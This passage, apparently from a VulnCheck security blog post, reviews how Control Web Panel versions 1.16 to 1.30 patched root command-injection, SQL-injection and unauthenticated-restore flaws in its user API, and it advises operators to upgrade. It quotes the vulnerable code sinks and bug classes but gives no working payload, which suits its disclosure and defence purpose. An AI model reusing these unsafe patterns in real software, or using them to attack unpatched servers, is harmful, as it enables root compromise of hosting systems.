-   [CVE-2026-77876](https://console.vulncheck.com/cve/CVE-2026-77876): `protected_directory` passes its `find` argument through `escapeshellarg`, and the POST actions go to the API instead of a local shell. The `deletedp` `sed` sink is removed.
-   [CVE-2026-77879](https://console.vulncheck.com/cve/CVE-2026-77879): the `access_token()` gate is a prepared statement (`authorization_code = ? AND client_id = ?`), so the UNION bypass no longer works.
-   [CVE-2026-77880](https://console.vulncheck.com/cve/CVE-2026-77880): `/newpass/` rejects any user not matching `/^[A-Za-z0-9._-]{1,64}\z/` with a `403`, and the password goes through `escapeshellarg`.

The user API itself did not move. `/restoredatabase/` still had no token and still ran `shell_exec('mysql ... < ' . $file)` as root, with `backup_handler.php` unchanged since 2022. The routes still had no global authentication: a new `cwp_sendcom_guard()` allow-list only protected one new route. And the [CVE-2026-77881](https://console.vulncheck.com/cve/CVE-2026-77881) query did not go away, it moved: `SELECT * FROM oauth_clients WHERE client_id="$user"` now sits on the tokenless `/valid_token/` route. That route also puts the raw user name in `shell_exec("grep -c '$user:' /etc/passwd")` as root, the separate command injection tracked as [CVE-2026-104080](https://console.vulncheck.com/cve/CVE-2026-104080). 1.23 was the same as 1.16 on all of this.

**1.27 and 1.29 (October 30 and 31): the user API is fixed.** There is still no global middleware on the 2302 app. Instead each sensitive route now enforces its own control, built on new shared helpers: `cwp_clean_username()` (allow-list `^[A-Za-z0-9._-]+$`, rejects `..`), `cwp_api_safe_home_path()` (`realpath` containment under `/home/<user>`) and `cwp_api_as_user()` (runs the command with `runuser -u <user>` and `escapeshellarg`, so as the account and not as root).

-   [CVE-2026-77878](https://console.vulncheck.com/cve/CVE-2026-77878): `/restoredatabase/` returns `403` "Token Invalid" through `access_token()` before the handler is loaded, `BackupHandler` is scoped to the calling account, and `restoreDBBackup()` confines the file to `/home/<user>/backupcwp/mysql` with `realpath` and wraps it in `escapeshellarg`. `backup_handler.php` changed for the first time since 2022.
-   [CVE-2026-77881](https://console.vulncheck.com/cve/CVE-2026-77881): the first statement of `/valid_token/` is now `$user = cwp_clean_username(...)`, and the route returns if the result is empty. The query still concatenates `$user`, but it can no longer carry a quote.
-   [CVE-2026-104080](https://console.vulncheck.com/cve/CVE-2026-104080): the same `cwp_clean_username()` gate prevents quotes and shell metacharacters from reaching `shell_exec("grep -c '$user:' /etc/passwd")`.
-   [CVE-2026-77877](https://console.vulncheck.com/cve/CVE-2026-77877): every sensitive route is now token-gated, input-validated, or runs as the account through `cwp_api_as_user()`. We found no tokenless route left that takes POST input into a root shell or a root SQL query.

We decoded 1.30, not 1.27 and 1.29 one by one, so the split between those two releases comes from the changelog: 1.27 lists "User panel API (port 2302): MySQL Manager no longer passes user input or passwords through a root shell", and 1.29 lists the session requirement on database restore and the validation of user lookups. On 1.30 all ten are fixed and the six fixed in 1.16 did not regress. The changelog claims match the code, with one overstatement: 1.29 says "Unused legacy restore actions were removed", but the `restore*` routes are still registered. They are gated and hardened now, so the result is the same.

CWP also redesigned their website, and the changelog changed with it. Before, a release said "Security improvements" and nothing more. From 1.26 on, each entry names the component, the port and the bug class: 1.27 alone reports "a large security review of all admin modules" with command-injection, SQL-injection, path-traversal, XSS and CSRF fixes, plus fixes on the external API (2304) and the user API (2302). The amount of fixes in a few days, across the admin panel, the user panel and both APIs, makes us suspect a large AI-assisted audit on the vendor side. This is inference, we have no confirmation from CWP. Either way it is a first for this product, and I believe they now take security much more seriously than before.

## Takeaways

The interesting thing here is not any single sink. Unsanitized request input reaching an include, a file write, or a root shell-out are all textbook. It is that the codebase already knows how to do every one of them correctly, ten lines away, in the admin panel. The admin dispatcher exits on failed auth and allow-lists the module name; the user panel is the same code with the `exit()` missing and the allow-list swapped for an XSS filter, and its modules trust a gate that no longer holds. A control panel's entire value is that boundary between low-privileged users and privileged actions, and the boundary in front of these modules was one keyword thick.

Operators running CWP should upgrade to 1.29 or later. Any build before 1.12 is reachable to root, unauthenticated, from a single valid account name, and any build before 1.29 lets any hosting account become root through the user API. Even on a fixed build, keep the user panel (2083) and the admin panel (2031/2087) off the public internet wherever possible and put them behind an allowlist.

**Further reading:** For another VulnCheck Initial Access Intelligence deep-dive into a closed-source appliance, read [FileRun: When Your File Manager Runs Your Files](https://vulncheck.com/blog/filerun-thumbnail-command-injection-rce).

## About VulnCheck

VulnCheck empowers organizations to transcend the challenges of vulnerability prioritization. Our suite of solutions provides product managers, PSIRT teams, and threat hunters with the tools required for accelerated, high-precision operations and infinite efficiency.

Recognizing the industry-wide necessity for superior data velocity and accuracy, we deliver high-fidelity insights to the market. We remain committed to surfacing critical intelligence on vulnerability exploitation and emerging trends, leveraging our unique dataset to support the practitioner community.

To deepen your understanding of these threats, [VulnCheck Exploit & Vulnerability Intelligence](https://vulncheck.com/product/exploit-intelligence) provides comprehensive coverage of global threat actors. Register for a demo to explore our intelligence today.
